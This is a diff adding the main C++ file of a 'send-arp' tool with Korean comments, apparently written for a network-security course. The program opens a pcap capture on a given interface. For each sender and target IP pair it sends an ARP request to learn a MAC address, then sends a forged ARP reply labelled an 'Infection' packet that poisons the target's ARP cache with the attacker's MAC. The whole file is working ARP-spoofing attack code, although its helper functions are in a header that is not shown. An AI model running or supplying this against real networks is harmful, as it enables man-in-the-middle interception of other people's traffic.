@@ -1,0 +1,46 @@
+#include "send-arp.h"
+
+int main(int argc, char* argv[]) {
+    // 1. 인자 개수 검사
+	// 최소 4개여야 하고, 전체 개수는 짝수여야 함 (프로그램+인터페이스, 그리고 IP 쌍들)
+    if (argc < 4 || argc % 2 != 0) {
+        usage();
+        return -1;
+    }
+
+    // 2. pcap 핸들 열기
+    char* dev = argv[1];
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (pcap == nullptr) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
+    }
+    printf("Device %s opened successfully.\n", dev);
+
+    const char* attacker_mac = getMyMac(dev);
+    if (attacker_mac == nullptr) {
+        fprintf(stderr, "Failed to get MAC address for %s\n", dev);
+        return -1;
+    }
+
+    // 3. 반복문으로 모든 IP 쌍에 대해 공격 수행
+    for (int i = 2; i < argc; i += 2) {
+        const char* sender_ip = argv[i];
+        const char* target_ip = argv[i+1];
+        
+        // 각 IP 쌍에 대해 ARP 공격 함수 호출
+        // 1. Target IP의 MAC 주소를 얻기 위해 ARP Request를 보냄
+        // 2. 응답으로 Target의 MAC 주소를 알아냄
+        uint8_t* target_mac = setMac("FF:FF:FF:FF:FF:FF");
+        uint8_t* sender_mac = setMac("00:00:00:00:00:00"); 
+        sender_mac = send_arp_attack(pcap, sender_mac, sender_ip, target_mac, target_ip, ArpHdr::REQUEST, "00:00:00:00:00:00");
+        // 3. 위조된 ARP Reply (Infection) 패킷을 Target에게 전송
+        send_arp_attack(pcap, sender_mac, sender_ip, target_mac, target_ip, ArpHdr::REPLY, attacker_mac);
+    }
+    
+    printf("----------------------------------------\n");
+    printf("All ARP attack packets have been sent.\n");
+
+	pcap_close(pcap);
+}
